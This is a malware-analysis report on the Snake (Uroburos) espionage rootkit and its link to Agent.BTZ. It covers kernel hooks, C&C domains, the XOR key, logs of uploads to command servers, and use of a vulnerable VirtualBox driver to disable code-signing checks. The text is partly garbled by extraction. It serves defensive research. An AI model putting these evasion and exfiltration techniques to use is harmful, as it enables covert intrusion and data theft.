started sharing and analyzing your threat intelligence.In other words, what happened to the operators, tools, and infrastructure
which was revealed in the reports, blog-posts, and press interviews.Did they continue on as before, did they re-build the disclosed infrastructure and tools, did they go
away and get jobs in another line of work?In some cases, the disclosure had little, if any impact on the operation.For example, after the
McAfee ShadyRAT report in 2011, there was absolutely no change in the attacks from the group
behind this.However, when Mandiant released their APT1 report in 2013, there was a noticeable
reduction in activity from the group – and much of the tools and infrastructure has not been seen
since.In the September 2010 issue of Foreign Affairs magazine1, former US Deputy Secretary of Defense
William J. Lynn discussed a cyber-attack which happened two years previously on the DoD’s
classified computer networks.Lynn described how a foreign intelligence agency planted malicious
code on the networks with the aim of transferring data to servers under their control.The article included the now oft-quoted phrase ‘digital beachhead’ to describe what was
undoubtedly a significant compromise of US military systems.Further reports in the press2 kept the
story alive in 2011, but since then this threat has received remarkably little attention.However, the operation behind the attacks has continued with little modification to the tools and
techniques, in spite of the widespread attention a few years ago.They use highly sophisticated
malware tools to maintain persistent access to their targets.These tools can be used for covert
communications in a number of different modes, some of which present significant challenges for
traditional security technologies to detect.There are some threats which come and go, whilst there are others which are permanent
features of the landscape.In this paper, we describe the tools and techniques of one of the most
sophisticated and persistent threats we track.We hope this will help victims identify intrusions and
understand their need to improve defences.The variant letters are also assigned automatically, by using hexavigesimal
(or Base26) notation.That is, the variant letters are auto-assigned starting from “A”, followed with “B”, and so on until “Z”.Next
comes “AA”, “AB” and so on, until “ZZ”.After that, the variant letters start from “AAA”, “AAB” and so on, until “ZZZ”.Back in 2008 an unknown malicious file was discovered and auto-classified as “Agent.BTZ”, meaning it was registered as unknown
malicious sample #1,898 in an anti-virus classification system.It wasn’t given an actual name, only a generic one.Meanwhile, internally the authors behind this malware were using their own naming systems - with specific titles for their file
components and projects such as “snake”, “uroburos”, “sengoku”, and “snark“ used to denote variants of their framework.A recent report from German security company GData3 described a sample from the “uroburos” variant of this framework.Their
report revealed the complex nature of this malware family, and showed that the operation behind “Agent.BTZ” has continued.As
a result of this disclosure, we are also releasing our own technical analysis of the threat, including a timeline of known samples,
known Command-and-Control (C&C) servers, and other indicators to aid investigators in discovering attacks.Reverse engineering of recent malware samples shows these to be much more advanced variants of Agent.BTZ, though still sharing
many similarities and encryption methods with the original.Further investigation allowed us to locate related samples compiled
between 2006 and 2014, and spanning across several distinctive generations.The first section of this report gives an overview of
the samples collected, where they were reported and the timelines derived from their analysis.Snake’s architecture turned out to be quite interesting.We have identified two distinct variants, both highly flexible but with two
different techniques for establishing and maintaining a presence on the target system.In general, its operation relies on kernel
mode drivers, making it a rootkit.It is designed to covertly install a backdoor on a compromised system, hide the presence of its
components, provide a communication mechanism with its C&C servers, and enable an effective data exfiltration mechanism.At the
same time, Snake exposed a flexibility to conduct its operations by engaging these noticeably different architectures.In the first model, the network communications are carried out from the userland - i.e.the area of the computer system where
application software executes.In another model, the network communications are handled by a kernel mode driver - i.e.the area
where lower level system code such as device drivers run.The choice of what architecture should be used may depend on a specific
target’s environment, allowing the Snake operators to choose the most suitable architecture to be deployed.In both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes.In both architectures, there is both 32-bit and 64-bit code involved.In order to distinguish between these architectures, we will call
them the usermode-centric and the kernel-centric architectures respectively.The remainder of this report gives a detailed explanation of how the two Snake architectures embed themselves in the target
system and communicate with the outside world.We have also provided a set of technical indicators in the Appendix to enable
organisations and the security research community to identify compromises.3
 	       https://www.gdata.de/rdk/dl-en-rp-Uroburos


                                                                BAE Systems Applied Intelligence: Snake Rootkit Report 2014               5
SNAKE SAMPLES
In total we have collected over 100 unique files related to this espionage toolkit.Many of these were submitted to online malware
analysis websites by victims and investigators over several years.In many cases the source country information of the submission
is available.Other useful visualisations of the operations come from the compile timestamps.Below is shown a table with a count of the
number of files in our sample set from recent years.Two samples compiled in late January 2014 show that this activity is ongoing.The creators of the malware operate a working week, just like any other professional.The single sample in our set which was
compiled on a Saturday is an outlier, but doesn’t alter the conclusion.Similarly, plotting the hour of the day in which the samples
were compiled reveals another human pattern – the working day.This has been adjusted to UTC+4 to show a possible fit to the
operators’ local time.With this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that
module for the communications.One of the analysed samples exposed multiple debug messages and source control check-in logs.It is not clear why those
messages were allowed in the deployed driver - possibly an operational security lapse.However, they give some insight into the
internal structure of the source code.BAE Systems Applied Intelligence: Snake Rootkit Report 2014        7
ROOTKIT EXECUTION
When first executed, the driver creates device named \Device\vstor32 with a symbolic link \DosDevices\vstor32.This device is used for userland/kernel communications.Next, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with
XOR 0xAA applied on top of it, so the driver decrypts it first.Depending on the variant, the DLL is dropped either under a random name or a hard-coded name, such as mscpx32n.dll.The purpose of this DLL is to be injected into the user-mode processes.Some variants of Snake carry the DLL modules that can be
installed as a service, to be run within taskhost.exe or services.exe processes.Next, the driver sets up the hooks for the following kernel-mode APIs:

    •	 ZwCreateThread
    •	 ZwCreateUserProcess
    •	 ZwShutdownSystem

After that, it calls PsSetCreateProcessNotifyRoutine() in order to be notified whenever a new process is started.The handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect
any newly created processes, and restore its driver file in case it gets deleted.Another set of hooks it sets is designed to hide the presence of the Snake components on the system:

    •	 ZwQuerySystemInformation
    •	 ZwQueryInformationProcess
    •	 ZwClose
    •	 ZwTerminateProcess

The driver then watches for all userland processes to see if they load any web pages.As long as the user is not using the Internet, Snake stays dormant too, as there is no process that communicates with the web
servers.However, as soon as the user goes online, the driver intercepts that event and then immediately injects the malicious DLL module
into the process that initiated connection (the browser).Once injected, the module initiates polling from one of the hard-coded C&C servers.The purpose of this behaviour is to blend Snake’s traffic with the browser traffic, bypassing the firewalls, and keeping a low profile
at the same time.By communicating from within a process that also communicates, even a technically savvy user will find it
challenging to detect Snake traffic among legitimate traffic.The reason behind such difficulty is because modern web pages often fetch pages from the different web servers, including such
data as additional scripts, CSS templates, advertising contents, analytics data, blogs, social networking data, etc.When intercepted
with the purpose of analysis, such traffic may literally represent itself hundreds of DNS and HTTP requests made when a popular
website, such as a news website is open.Hiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed.In order to test Snake’s communications with the C&C servers, and still being able to clearly distinguish its traffic, a small tool was
built to generate GET request to a web server running on the analysed system.The tool was named as chrome.exe in order to trigger the malware communications.BAE Systems Applied Intelligence: Snake Rootkit Report 2014               8
COMMAND-AND-CONTROL COMMUNICATIONS
As long as the test tool named chrome.exe did not make any requests, its memory stayed pristine.There were no injections made
by the driver.As soon as the tool made its first GET requests, the driver immediately injected a malicious DLL module in it, and that module
started producing the following traffic:

No.Some examples are given below, and
a full list of known domains is given in the Appendix D:

      •	 north-area.bbsindex.com
      •	 winter.site11.com
      •	 swim.onlinewebshop.net
      •	 july.mypressonline.com
      •	 toolsthem.xp3.biz
      •	 softprog.freeoda.com
      •	 euassociate.6te.net

As seen in the traffic dump above, the malware first resolves the domain name of its C&C.In order to decrypt it, the malware first
applies the XOR mask to the bytes that start from offset 0x40:

    1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6g
    s923HL34x2f5cvd0fk6c1a0s

An identical XOR mask was also used by Agent.BTZ.Next, it calculates and confirms a CRC32 checksum within the command, further decrypts the data by using the Number Theory
Library (NTL), and makes sure the command is destined to the current host by matching the ID field in it.0    1    2    3    4    5    6    7    8     9    A    B    C    D    E    F    0123456789ABCDEF
              00000000    74   E4   7E   F4   9E   8E   D8   65   B3    06   EB   B3   08   EA   3E   84   t.~....e......>.00000080    23   F9   A4   DF   D3   F1   18   97   4D    CD   71   D0   52   D6   A2   E9   #.......M.q.R...
              00000090    FF   58   30   3D   A8   8A   DD   4D   3F    DB   AE   9A   F5   07   3B   21   .X0=...M?.....;!000000A0    67   5A   34   22   AD   60   CB   DD   A4    E2   B5   77   A1   6A   4C   2E   gZ4”.`.....w.jL.000000B0    C8   75   91   01   CA   5B   B3   28   3E    55   C8   68   B2   2C   40   E4   .u...[.(>U.h.,@.000000C0    02   A9   64   8B   80   BD   0E   AB   58    25   00   40   6E   AB   DD   5B   ..d.....X%.@n..Once decrypted, the malware interprets the received command, as reflected in the malware log below (the new C&C server address
is highlighted in it):

    03:52:12 Del after 0
    03:52:12 Run instruction: 6 ID:303149772147483647(13:41:34 05/08/2013)
    03:52:12 Add address &marketplace.servehttp.com&/UPDATE/&cert1024&Un77ko#s&&&
    03:52:12 Finish run instruction.After that, the malware connects to the new C&C, asking it for another command:

    03:52:13 1400: Connect marketplace.servehttp.com                              type(0)... OK
    03:52:13 1400: GET /IMAGE/pub.html
    03:52:15 1400: Http status: 200
    03:52:16 1400: recv 1/1
    03:52:16 DownLoad 1 command(s).BAE Systems Applied Intelligence: Snake Rootkit Report 2014   10
The command it receives is called UpLoad, so it uploads all the collected logs to the server, and then cleans out those logs:

    03:52:16 UpLoad: http upload 4 file(s).For example, Snake’s home directory could be C:\WINDOWS\$NtUninstallQ812589$.The files within that directory are used by the rootkit to store configuration and log data.When decrypted with the same XOR key that was used by Agent.BTZ, these files expose the following contents:

    •	 mtmon.sdb - C&C communication log that looks as the logs shown above.•	 mtmon_.sdb - installation log, that shows infected processes (Internet Explorer), the random name of the dropped DLL
       (e.g.•	   In the first mode, it relies on Windows Internet (WinINet) APIs, such as HttpOpenRequest(), HttpSendRequest(),
        InternetReadFile(), etc.•	   In the second mode, it uses Windows Sockets 2 (Winsock) APIs, such as WSAStartup(), socket(), connect(),
        send(), etc.•	   In the third mode, it works in the ‘pipe server’ mode, when it passes the web requests it is interested in (as a client) to the
        pipe server that runs within Windows Explorer (explorer.exe) and/or Internet Explorer (iexplore.exe) processes.Memory pipes is a common mechanism for Inter-Process Communications (IPC).When the pipe server reads such requests from the
pipes, it performs the web request on behalf of a client by using WinINet APIs, so it effectively serves as a proxy.The diagram below demonstrates the last, ‘pipe server’ mode of Snake operation:


                   Injected Snake DLL               System Process
                                                   (e.g.a browser)




User Mode
                                 2

                                                                           1
Kernel Mode


                                                                                                                   Legitimate Process
                                                                                                                    (e.g.As soon as the driver detects a usermode process that goes online (e.g.a browser), it will inject malicious DLL module
    2     into it; depending on the operational mode, the DLL may start communicating with C&C directly.In the ‘pipe mode’ of operation, the injected DLL will start communicating with the pipe server by sending messages into
    3     the established inter-process communication pipes.Once the task of communication with C&C is delegated to the pipe server, it will start communicating with the C&C,
    4
          bypassing the host-based firewalls that keep an infected system process in a white-list.BAE Systems Applied Intelligence: Snake Rootkit Report 2014         12
The reason behind the pipes usage is to ‘legitimise’ the outbound web requests, forcing them to originate from the host firewall-
friendly system services.Pipe server is a special mode of the injected DLL.In order to switch into that mode, a dedicated thread is spawned to listen for IPC
messages received through the pipes.The memory pipes used by Snake are named as:

    •	 \\.\Pipe\SP[COMPUTERNAME]
    •	 \\.\Pipe\UP[COMPUTERNAME]

    where [COMPUTERNAME] is the name of the host computer.Apart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other
operations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry
under the aforementioned ShellCore value.This delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as
possible.Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files/
registry.To delegate different types of tasks, the clients send messages to the pipe server using the following task identification headers:

    •	   DATA
    •	   CREATE
    •	   CMD
    •	   POST
    •	   GET
    •	   DEL
    •	   REGISTR
    •	   COPY

The usermode component of Snake communicates with its kernel-mode driver via a device called \\.\vstor32 (created under
kernel as \Device\vstor32).In its communication protocol with the driver it uses the IOCTL code of 0x222038.To write data, it opens the device with CreateFile(“\\.\vstor32”), then calls DeviceIoControl() API on its handle with
IOCTL code of 0x222038.Configuration parameters along with the initial set of domain names are hard-coded within the body of the DLL.However, the data
appears to be defined in the structures, so it is very likely the DLL could be generated by a stand-alone builder that ‘patches’ the
DLL with the new/updated list of C&C.The ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible,
making possible the existence of the hybrid (kernel-centric and usermode-centric) architectures.For example, the virtual partitions are used by kernel-centric Snake variants, where the kernel-mode driver is responsible for the
communications.If such a driver is installed via an update, the usermode component can be instructed to delegate the file upload
task to the driver by copying all the necessary logs into the shared virtual partition, physically located on the compromised host and
thus, accessible from kernel.BAE Systems Applied Intelligence: Snake Rootkit Report 2014           13
KERNEL-CENTRIC ARCHITECTURE
This particular architecture relies on a kernel-mode driver to carry out the network communications.The usermode DLLs are still
injected into the system processes to perform high-level tasks.The delivery mechanism is not known: it may be distributed via a thumb-drive, a phishing email attachment, or be delivered via an
exploit across the network (e.g.by using the reconnaissance tool that is explained later).Infection starts from a dropper penetrating into the compromised system where it is allowed to run.Once executed, the dropper
installs the kernel mode driver in a pre-defined location.The dropper itself is 32-bit, so it will run both on 32-bit and 64-bit Windows
OS (in WoW64 mode).On a 32-bit OS, it will install a 32-bit driver.On a 64-bit OS, it will install a 64-bit driver.The analysed 32-bit dropper creates a driver in the following location:

%windows%\$NtUninstallQ817473$\fdisk.sys

However, different samples may use a different path and driver file name.For example, some samples exposed these filenames:
fdisk_32.sys, A0009547.sys, or Ultra3.sys.The filename of the dropper could be rkng_inst.exe or fdisk_mon.exe.REGISTRATION
Once executed, the driver first makes sure it is registered under a pre-defined name, such as Ultra3.Other samples may have a different registration name, such as ~ROOT.The registration is ensured with creation of the following
registry entries:

    ErrorControl = 0
    Group = “Streams Drivers”
    ImagePath = %windows%\$NtUninstallQ817473$\fdisk.sys
    Start = 1 [SYSTEM]
    Type = 1

in the newly created registry key

    HKEY_LOCAL_MACHINE\System\CurrentControlSer\Services\Ultra3

The driver then flags the following events with the notification purposes:

    \BaseNamedObjects\{B93DFED5-9A3B-459b-A617-59FD9FAD693E}
    \BaseNamedObjects\shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}

The rootkit then places a number of the hooks.SYSTEM HOOKS
The first API it hooks is IoCreateDevice().The installed hook handler calls the original API and then checks if the name of the
device is netbt or afd.If so, it will install a TDI filter driver.If the device name is Null, Beep, tcpip or Nsiproxy, it will activate
itself by enabling its hooks designed to hide the presence of Snake on a system, set up its access control lists and the messaging
system.In one example, the rootkit blocks access to registry entries that contain the strings “Ultra3” and “~ROOT”.The ZwReadFile() hook handler will block access to the home directory where the rootkit keeps its file.In one of the analysed
kernel-centric Snake samples the home directory was hard-coded as %windows%\$NtUninstallQ817473$, so it blocked file
read access from that directory.The ZwClose() hook handler is used to inject the DLL module into the userland processes.The hook handler for ZwTerminateProcess() checks if the process being shut down is svchost.exe.If so, it considers
it to be a system shutdown, so it unloads its usermode DLL and deactivates its own network drivers, just like it does when its
ZwShutdownSystem() hook handler gets invoked.The ObOpenObjectByName() hook is designed to hide the presence of its virtual partitions (described later).To encrypt data stored on its virtual partitions, the driver sets a hook for another API:

         IofCallDriver()

To re-infect the usermode process svchost.exe and to re-enable its network drivers, the rootkit hooks these APIs:

    •	 ZwCreateThread
    •	 ZwCreateUserProcess



WFP CALLOUT DRIVER
Snake then proceeds to the task of deep packet inspection and modification.In order to accomplish it, it registers a callout driver for Windows Filtering Platform (WFP), an architecture first introduced with
Windows Vista and nowadays normally used by antivirus and/or intrusion detection systems to inspect/block malicious traffic.Snake sets filters at the layers FWPM_LAYER_STREAM_V4 and FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4 in the TCP/
IP stack, so that its callout driver is notified whenever a TCP connection is established by a browser.When that happens, the
rootkit triggers an event named \BaseNamedObjects\wininet_activate.When the data arrives, it is intercepted with the
FwpsCopyStreamDataToBuffer0() API, and then scanned for the presence of the hidden commands from C&C.The driver inspects bidirectional network data on a per stream basis, as it’s located right on the stream data path.TDI is considered deprecated and will be removed in future versions of Microsoft Windows, but it’s still supported on Windows 7.Being registered as a TDI driver on the device stack, Snake hooks TCP calls.This way it intercepts all requests along with their
parameters via IRP (IO request package) hooks.By ‘sniffing’ all the requests, it can now inspect the traffic, looking for and then parsing GET/POST HTTP requests and also SMTP
communications, in order to distinguish commands addressed to itself.If the rootkit detects that the OS version is pre-Vista (e.g.Windows XP) or Windows Server 2008 (e.g.Windows Server 2003), it will
invoke FwpsStreamInjectAsync0() API in order to generate outbound requests.Whenever the client establishes connections, the TDI driver will also ‘pulse’ the \BaseNamedObjects\wininet_activate
event, just like the WPF driver’s component of it, in order to notify the userland service about the event.The data that the driver intercepts, along with the important notifications, is passed to the userland DLL to be processed.If the
data contains commands from C&C, the DLL module is expected to execute them and report results back to the driver to be
delivered back to C&C.NDIS HOOKING
For NDIS versions 5.X, Snake rootkit contains code that installs NDIS filter intermediate driver.This driver is set up above a miniport driver (a driver that communicates with the physical device) and below a protocol driver (a
driver that implements a protocol, e.g.TCP/IP).The driver is registered with NdisIMRegisterLayeredMiniport() API.With its own miniport handler functions, it can send/receive data by using a private TCP/IP stack, bypassing all firewall hooks, and
making its open ports invisible to scanners.NDIS PROTOCOL DRIVER
The Snake rootkit registers itself as Network Driver Interface Specification (NDIS) protocol driver.NDIS Protocol                                        Miniport
                                  NDIS                                     When that happens, NDIS invokes Snake’s hook function
        Driver                                             Driver
                                                                           (ProtocolReceiveNetBufferLists) to process the
       ProtocolReceiveNetBufferLists()                                     received data.Sending Network Data                                                   To send the data back, the protocol driver defines the data
                                                                           in a list of NET_BUFFER_LIST structures, and then passes
                                    MiniportSendNetBufferLists()
                                                                           them to NDIS by calling NdisSendNetBufferLists().NDIS Protocol                                       Miniport
                                  NDIS                                     NDIS, in turn, calls the miniport driver’s
        Driver                                            Driver
                                                                           MiniportSendNetBufferLists() function to forward
           NdisSendNetBufferLists()                                        the data to an underlying miniport driver.on TDI_RECEIVE TDI event or ClientEventReceive() event notification triggered
through its TDI Filter Driver), it parses all incoming HTTP and SMTP traffic to see if it can be authenticated as Snake traffic.The authentication is implemented by decrypting the data and making sure it starts with the markers 0xDEADBEAF and
0xC001BA5E (which appear to derive from ‘DEAD BEEF’ and ‘COOL BASE’).Why does it act like HTTP/SMTP
server processing client traffic, and serving back normal responses as per the protocol?For example, in HTTP the driver will respond with messages like “HTTP/1.1 200 OK” or “HTTP/1.1 500 Server Error”.For SMTP traffic, it communicates back normal SMTP server responses, such as “250 Sender OK”, “503 Bad sequence of
commands”, etc.The reason behind such behaviour is that the driver is acting in this mode like a proxy, routing requests from other infected hosts to
a remote C&C server.Another opportunity this mode unlocks is a peer-to-peer network mode with no centralised C&C.The infected hosts are capable
of transferring the following peer-2-peer commands defining fragment size, reliability parameters, new peer information, peer
impersonation flags, etc.:

    •	 frag_size
    •	 frag_no_scrambling
    •	 peer_frag_size
    •	 read_peer_nfo
    •	 write_peer_nfo
    •	 imp_level
    •	 reliable_n_tries
    •	 reliable_keepalive
    •	 reliable_rtt
    •	 reliable_padding
    •	 reliable_no_keepalive
    •	 m2b_raw
    •	 psk
    •	 key

Once the incoming data is authenticated and decrypted, the driver passes it to the DLL by using memory pipes.For example, on HTTP traffic arrival it may send traffic data into a memory pipe \Device\NamedPipe\isapi_http, and then,
send a received peer-2-peer command message write_peer_nfo=[IP_ADDRESS:PORT]0frag_no_scrambling=Y0 into
another memory pipe called \Device\NamedPipe\isapi_dg.In order to log its activity, the driver writes log data into the pipe \Device\NamedPipe\isapi_log, so that the DLL could log the
data into the log files.Full list of the named pipes used for communications is provided below:

    •	 \Device\NamedPipe\isapi_http
    •	 \Device\NamedPipe\isapi_log
    •	 \Device\NamedPipe\isapi_dg
    •	 \Device\NamedPipe\services_control

Messages submitted into the pipes are wrapped into the structures.The structures appear to contain headers to allow the pipe
server, that runs within an infected userland module, to identify the messages first and then unwrap the structures accordingly.For example, the message headers could be:

    •	 domc.np
    •	 frag.np


Once received from the pipes and unwrapped/decoded, the data is then handled by the usermode DLL as per the data intention -
whether it’s a traffic sniffing task, a peer-2-peer client logic, a logging task, or a task of saving received files into the virtual volumes.BAE Systems Applied Intelligence: Snake Rootkit Report 2014             19
VIRTUAL FILE VOLUMES
The driver creates virtual file volumes for encrypted storage of its files and configuration data:

    •	 \\.\Hd1
    •	 \\.\Hd2

The volumes are mounted from the virtual file systems RawDisk1 and RawDisk2.The encryption algorithm is based on CAST-128, with the hard-coded key stored in the rootkit
body.As a result, whenever the data is saved into the volume Hd1, it will be scrambled on-the-fly, and reflected in the persistent storage
file hotfix.dat, which is physically located within the rootkit’s ‘home’ directory:

   Z:\WINDOWS\$NtuninstallQ817473$>dir
     Volume in drive Z has no label.Volume Serial Number is 2479-98AC


     Directory of Z:\WINDOWS\$NtuninstallQ817473$


   13/02/2014        04:47 PM         <DIR>                 .13/02/2014        04:47 PM         <DIR>                 ..
   03/02/2014        01:57 PM                    210,944 fdisk.sys
   13/02/2014        04:47 PM              104,857,600 hotfix.dat
                         2 File(s)          105,068,544 bytes
                         2 Dir(s)        8,406,433,792 bytes free


Analysis of the hotfix.dat file contents reveals it’s a fully encrypted file with flat entropy.Thus, it is not possible to reveal the
contents of the Snake’s volume by accessing the contents of this file (unless the encryption is broken, that is).Enlisting the contents of the created volume is possible, along with creating files on it:


    C:\>echo Test > \\.\Hd1\Test.txt

    C:\>type \\.\Hd1\\Test.txt
    Test

    C:\>dir \\.\Hd1\\
      Volume in drive \\.\Hd1 has no label.The second volume \\.\Hd2 is not mapped to a file, so when a computer is switched off, its contents is lost.Thus, it could be
used as a temporary or a cache storage.The data stored in \\.\Hd2 is encrypted the same way the first volume’s data.Both volumes appear to be set up as FAT volumes.The ability to keep its data on TrueCrypt-like volumes provides Snake with a powerful ability to exchange data with the usermode
 DLL, as these volumes are accessible both from usermode and kernel mode.Static analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it.For example, it stores its message queue in a file called:

 \.\\Hd1\queue

 The message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL,
 e.g.to pass commands, configuration parameters, binary images of additional Snake components.Other files that may also be found on the virtual volume are: klog, conlog, dump, rkng_inst.exe,

 where rkng_inst.exe could be the name of the original dropper, and other log files could potentially contain executed command
 outputs, intercepted keystrokes, and other output logs.BAE Systems Applied Intelligence: Snake Rootkit Report 2014   21
64-BIT EDITIONS OF WINDOWS
The 64-bit version of Snake must deal with a number of additional security protections implemented in 64-bit editions of Microsoft
Windows, the most significant of which are kernel driver signature validation and Kernel Patch Protection (more commonly known as
PatchGuard).PatchGuard is a feature of 64-bit Windows which aims to prevent modification of the Windows kernel, something that is often
performed by malware attempting to hide itself on an infected system.Although PatchGuard is successful at preventing kernel
patching once initialised, several published bypass approaches exist4,5.The technique used by Snake appears to be similar to these
approaches.The driver signing policy enforced by all 64-bit versions of Windows from Vista onwards requires all kernel-mode drivers to be signed
with a valid digital signature.The Snake dropper contains both 32-bit and 64-bit unsigned drivers, and it can successfully load its
unsigned 64-bit driver on a 64-bit version of Windows XP – as driver signing is not enforced it does not have to resort to any tricks
under this OS version.In this case, in order to ensure the driver is loaded automatically at startup, the dropper can install the 64-bit
driver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP.On 64-bit versions of Windows Vista and above it behaves differently.Firstly, the 64-bit unsigned driver file is created as usual:

     %windows%\$NtUninstallQ817473$\fdisk.sys

However, the driver is not registered; what is registered instead is the dropper itself.The answer: Yes, it does.Does it resort to using bootkit technology, which has been used in the past to bypass protections to load unsigned 64-bit drivers?The answer: No.Bootkits must overwrite the Master Boot Record (MBR) and antivirus products are well trained to catch that kind of
bad behavior.The masterminds behind Snake rootkit seem to be well aware of this so what they resorted to instead is leveraging a vulnerability
in a well-known virtualization product called VirtualBox, a product made by Oracle which is widely used by researchers to analyse
malware.VirtualBox driver version 1.6.2 was released in June 2, 2008.Two months later, in August 2008, security researchers
reported that its main driver component, which is signed under the entity “innotek Gmbh”, contained a privilege escalation
vulnerability6.In a nutshell, the VirtualBox software installs a driver called VBoxDrv.The driver is controlled with the Input/Ouput Control Codes
(32-bit values called IOCTL) passed along DeviceIoControl() API.One of the documented transfer methods that the system
uses to pass data between the caller of DeviceIoControl() API and the driver itself is called METHOD_NEITHER.As per MSDN documentation7, METHOD_NEITHER is a special transfer type when Input/Output Request Packet (IRP) supplies the
user-mode virtual addresses of the input and output buffers, without validating or mapping them.The source code of the vulnerable driver (shown below) demonstrates how the integer value of the rc variable is first derived from
the input parameters pDevObj (device object) and pIrp (request packet).Next, that integer value is written into the UserBuffer - an
arbitrary address, pointed by the input parameter pIrp (request packet).As there are no validations made for the UserBuffer an
attacker can craft such input parameters that will define address within kernel memory to patch and the data to patch it with:

    01     /**
    02       * Device I/O Control entry point.03       *
    04       * @param   pDevObj     Device object.05       * @param   pIrp        Request packet.When running in WinPE mode there is no Code Integrity control, therefore by enabling this mode by patching only one bit,
Code Integrity verification is disabled so that the unsigned 64-bit driver can be loaded.This variable is used within the function SepInitializeCodeIntegrity(), implemented within CI.dll’s function
CiInitialize() and imported by the NT core (ntoskrnl.exe).In order to find the variable in kernel memory, the Snake
dropper loads a copy of the NT core image (ntoskrnl.exe), locates the import of CI.dll’s function CiInitialize(), and then
SepInitializeCodeIntegrity() within it.Then it parses the function’s code to locate the offset of the variable.Once located, the content of the variable nt!g_CiEnabled is patched in kernel memory and the 64-bit unsigned driver is loaded.This explains why Snake dropper registers itself as a service to start each time Windows starts: in order to install the vulnerable
VBox driver first, then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl() API call, and
finally, load the driver.In order to be able to perform the steps above, the dropper must first obtain Administrator privileges.It attempts to do this by
running MS09-025 and MS10-015 exploits on the target system.These exploits are bundled within the dropper in its resource
section as executable files.Other resources embedded within the dropper are the 32-bit and 64-bit builds of its driver, a tool for
creating NTFS file systems, and the initial message queue file which is written into the virtual volume.The message queue file
contains configuration data and the libraries that will be injected into usermode processes.BAE Systems Applied Intelligence: Snake Rootkit Report 2014            23
USERMODE DLLS
The usermode DLLs injected by the kernel-mode driver into the userland system process (e.g.It is designed to perform the high-level tasks
such as:

   •	     manage the configuration data (by using a queue)
   •	     exfiltrate data by using Windows Internet (WinINet) APIs or Windows Sockets 2 (Winsock) APIs:
           •	   communicate with the C&C server and receive commands to execute
           •	   submit logs to the C&C server and other reports

When the DLL activates, it reads configuration parameters from the configuration queue, that the driver creates on a virtual volume.One of the parameters defines the pipe name(s) that the DLL should use for its communications.BAE Systems Applied Intelligence: Snake Rootkit Report 2014        24
RECONNAISSANCE TOOL
One of the Snake components that could have been downloaded from a remote C&C server, was identified as a network
reconnaissance tool.When run as a command line tool, with its logic defined with the command line switches, this tool enumerates other network hosts
and detects what Windows RPC services are enabled at the endpoints.It carries a list of interface identifiers associated with
the named pipes.It then uses these identifiers to write a message to and read a message from the associated named pipes.By
knowing what RPC services are running, it can successfully fingerprint all network hosts by mimicking the Metasploit’s logic of OS
fingerprinting via SMB.The fingerprinting allows it to reveal the following characteristics for each host found in the network:

   •	   the version of the operating system
   •	   version of the service pack
   •	   the installed network services

The data it retrieves is encrypted and saved into a configuration file %system%\vtmon.bin.This file is then further encrypted with
an NTL-based (Number Theory Library) algorithm and is uploaded by the usermode-centric Snake rootkit to the C&C server, along
with other configuration files, such as mtmon.sdb, mtmon32.sdb, gstatsnd.bin, gstat.bin, gstat32.bin, and other log
files found in the %windows%\$NtUninstallQ[random]$ directory.By using this function the remote attacker can identify any potentially exploitable hosts located in the same network as the victim.The attacker may then craft an exploit against those hosts, possibly by using the Metasploit framework, and then deliver the
generated shellcode back to the reconnaissance tool to be applied against the identified hosts by running the tool with the
‘exp_os’ switch.If the tool successfully delivers the payload and exploits the remote host(s), it will replicate the infection across the network, taking
control over new hosts, thus repeating the infection cycle all over again and spreading the infection further.Unlike traditional worm
techniques, this process is rather manual, but its danger is in the fact that the attacker can flexibly craft new attack methods,
adjusting them to the hosts present within the network, thus preying on the weakest (least updated, most vulnerable) victims along
its path.BAE Systems Applied Intelligence: Snake Rootkit Report 2014            25
RELATIONSHIP TO AGENT.BTZ
As seen from the check-in logs found within one of the recent samples, the time span covers almost 6 years from January 2007 till
December 2012, which is aligned with the first reports of Agent.BTZ.It’s worth noting that Agent.BTZ used the same XOR key for its
logs as the most recent variants:

1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s

Log files created by the latest samples of Snake, compiled in 2013 and 2014, were successfully decrypted with the same XOR key.Other similarities include the usage of the virtual partition \\.\Vd1, the temporary file named FA.tmp, usage of files named
mswmpdat.tlb, wmcache.nld, winview.ocx.CONCLUSION
The cyber-espionage operation behind the Snake rootkit is well established, a sample comiled in January 2006 indicates that
the activity would have begun in at least 2005.It is also sophisticated, using complex techniques for evading host defences and
providing the attackers covert communication channels.Toolmarks left behind by the authors ‘vlad’ & ‘gilg’, leave tantalizing clues
as to the personas behind this.From a technical perspective, Snake demonstrates two very different approaches to the task of building a cyber-espionage toolkit.One approach is to delegate the network communication engine to usermode code, backed up by a usermode rootkit.Another
approach is to carry out all of the communications from the kernel-mode driver, which is a very challenging task by itself.The complexity of the usermode-centric approach is on par with Rustock rootkit - it uses similar techniques.It’s an old well-polished
technology that evolved over the years and demonstrated its resilience and survivability under the stress of security counter-
measures.The complexity of the kernel-centric architecture of Snake is quite unique.This architecture is designed to grant Snake
as much flexibility as possible.When most of the infected hosts are cut off from the outside world, it only needs one host to be
connected online.The traffic is then routed through that host to make external control and data exfiltration still possible.The presence of the reconnaissance tool in the Snake operators’ framework suggests the existence of an arsenal of infiltration
tools, designed to compromise a system, then find a way to replicate into other hosts, infect them, and spread the infection
even further.As demonstrated, the backdoor commands allow Snake to provide remote attackers with full remote access to the
compromised system.Its ability to hibernate, staying fully inactive for a number of days, makes its detection during that time very
